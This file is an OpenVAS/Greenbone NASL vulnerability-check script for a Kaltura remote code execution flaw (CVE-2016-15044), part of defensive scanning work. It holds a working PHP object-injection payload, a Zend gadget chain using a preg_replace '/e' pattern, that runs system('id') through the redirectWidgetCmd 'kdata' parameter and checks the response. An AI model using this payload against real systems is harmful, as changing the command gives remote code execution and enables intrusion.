# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:kaltura:kaltura";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807700");
  script_version("2025-07-25T05:44:05+0000");
  script_cve_id("CVE-2016-15044");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-07-25 05:44:05 +0000 (Fri, 25 Jul 2025)");
  script_tag(name:"creation_date", value:"2016-03-18 12:26:14 +0530 (Fri, 18 Mar 2016)");
  script_name("Kaltura < 11.1.0-2 / < 11.7.0-2 Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_kaltura_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("kaltura/http/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39563/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40404/");
  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/kaltura-php-object-injection-rce");
  script_xref(name:"URL", value:"http://www.security-assessment.com/files/documents/advisory/Kaltura-Multiple-Vulns.pdf");

  script_tag(name:"summary", value:"Kultura is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Tries to execute the 'id' command and checks the response.

  Note: This script checks for the presence of CVE-2016-15044 which indicates that the system is
  also affected by the other included CVEs.");

  script_tag(name:"insight", value:"Multiple flaws exist due to:

  - CVE-2016-15044: An improper validation of 'kdata' parameter in 'redirectWidgetCmd' function

  - No CVE: An improper sanitization of input in 'Upload Content' functionality

  - No CVE: An improper handling of 'file' protocol handler");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  code, to upload file and to gain access.");

  script_tag(name:"affected", value:"Kaltura version 11.1.0-2 and prior.");

  script_tag(name:"solution", value:"Update to version 11.7.0-2 or later.

  Note: Fixes are not available for some of the issues in version 11.0.0-2.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmd = "print_r(system('id')).die()";
cmd_len = strlen(cmd);

p = 'a:1:{s:1:"z";O:8:"Zend_Log":1:{s:11:"\0*\0_writers";a:1:{i:0;O:20:"Zend_Log_Writer_Mail":5:' +
    '{s:16:"\0*\0_eventsToMail";a:1:{i:0;i:1;}s:22:"\0*\0_layoutEventsToMail";a:0:{}s:8:"\0*\0_mail";O:9:"' +
    'Zend_Mail":0:{}s:10:"\0*\0_layout";O:11:"Zend_Layout":3:{s:13:"\0*\0_inflector";O:23:"' +
    'Zend_Filter_PregReplace":2:' + '{s:16:"\0*\0_matchPattern";s:7:"/(.*)/e";s:15:"\0*\0_replacement";s:' +
    cmd_len + ':"' + cmd + '";}' + 's:20:"\0*\0_inflectorEnabled";b:1;s:10:"\0*\0_layout";s:6:"layout";}' +
    's:22:"\0*\0_subjectPrependText";N;}}};}';

url = dir + "/index.php/keditorservices/redirectWidgetCmd?kdata=" + urlencode(str: base64(str: p));

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);
if(!res)
  exit(0);

id_res = eregmatch(pattern: "(uid=[0-9]+.*gid=[0-9]+[^.]+)", string: res);
if (!isnull(id_res[1])) {
  report = "It was possible to execute the 'id' command on the remote host.\n\nResult:\n" + id_res[1];
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
